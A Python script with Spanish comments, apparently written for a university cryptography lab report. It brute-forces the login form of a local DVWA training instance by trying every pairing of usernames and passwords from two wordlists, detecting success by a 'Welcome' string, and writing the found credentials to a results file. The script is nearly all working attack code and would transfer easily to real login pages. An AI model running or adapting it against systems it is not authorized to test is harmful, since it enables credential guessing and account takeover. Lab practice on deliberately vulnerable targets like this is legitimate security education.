import requests
import time
import sys

# ==========================================
# CONFIGURACIÓN DEL ATAQUE
# ==========================================
URL = "http://localhost:8806/vulnerabilities/brute/"
ARCHIVO_USUARIOS = "/home/pepecortishell/Documents/temp/lab2cripto/informe/dics/u.txt"    # Cambia esto si tu archivo tiene otro nombre
ARCHIVO_PASSWORDS = "/home/pepecortishell/Documents/temp/lab2cripto/informe/dics/p.txt"   # Cambia esto si tu archivo tiene otro nombre

def iniciar_ataque():
    print("=== DVWA Brute Force Script ===")
    
    # El usuario introduce el PHPSESSID fresco
    session_id = "3d1f4174def386ec6c6cf5b2d82af031"
    
    # Cabeceras HTTP usadas en el ataque
    headers = {
        "User-Agent": "felipematurana1.0",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "*/*",
        "Connection": "keep-alive"
    }

    # Cookies constantes e inyectadas
    cookies = {
        "PHPSESSID": session_id,
        "security": "low"
    }

    # Leer los diccionarios
    try:
        with open(ARCHIVO_USUARIOS, "r") as f:
            usuarios = [line.strip() for line in f if line.strip()]
        with open(ARCHIVO_PASSWORDS, "r") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError as e:
        print(f"\n[X] Error: No se pudo encontrar el archivo {e.filename}")
        sys.exit(1)

    print(f"\n[*] Diccionarios cargados: {len(usuarios)} usuarios y {len(passwords)} contraseñas.")
    print("[*] Iniciando ataque. Por favor, espera...\n")

    pares_validos = []
    iteraciones = 0
    start_time = time.time()

    # Lógica de fuerza bruta (Cluster Bomb)
    for usuario in usuarios:
        for password in passwords:
            iteraciones += 1
            
            # Parámetros GET
            params = {
                "username": usuario,
                "password": password,
                "Login": "Login"
            }

            try:
                # Realizamos la petición GET
                response = requests.get(URL, params=params, cookies=cookies, headers=headers)
                
                # Para mostrar progreso en terminal (borra y reescribe la misma línea)
                sys.stdout.write(f"\rProbando iteración {iteraciones}: {usuario}:{password}       ")
                sys.stdout.flush()

                # Condición de éxito
                if "Welcome" in response.text:
                    print(f"\n[+] ¡BINGO! Credenciales encontradas -> Usuario: {usuario} | Password: {password}")
                    pares_validos.append((usuario, password))
                    break # Rompe el bucle de contraseñas para este usuario y pasa al siguiente
                    
            except requests.exceptions.RequestException as e:
                print(f"\n[X] Error de conexión: {e}")
                sys.exit(1)

    # Cálculo de métricas finales
    end_time = time.time()
    tiempo_total = end_time - start_time

    print("\n\n[*] Ataque finalizado.")
    
    # Escribir resultados en el archivo
    guardar_resultados(pares_validos, tiempo_total, iteraciones, headers)

def guardar_resultados(pares, tiempo, iteraciones, headers):
    nombre_archivo = "resultados5.txt"
    try:
        with open(nombre_archivo, "w") as f:
            f.write("=== REPORTE DE ATAQUE FUERZA BRUTA ===\n")
            f.write(f"Iteraciones totales realizadas: {iteraciones}\n")
            f.write(f"Tiempo total de ejecución: {tiempo:.2f} segundos\n")
            f.write("-" * 40 + "\n")
            f.write("CABECERAS HTTP UTILIZADAS EN EL ATAQUE:\n")
            for nombre, valor in headers.items():
                f.write(f"  {nombre}: {valor}\n")
            f.write("-" * 40 + "\n")
            f.write("PARES VÁLIDOS ENCONTRADOS:\n")
            
            if not pares:
                f.write("No se encontraron credenciales válidas o la sesión expiró.\n")
            else:
                for u, p in pares:
                    f.write(f"Usuario: {u} | Password: {p}\n")
                    
        print(f"[+] Resumen guardado exitosamente en '{nombre_archivo}'")
    except Exception as e:
        print(f"[X] Error al guardar el archivo: {e}")

if __name__ == "__main__":
    iniciar_ataque()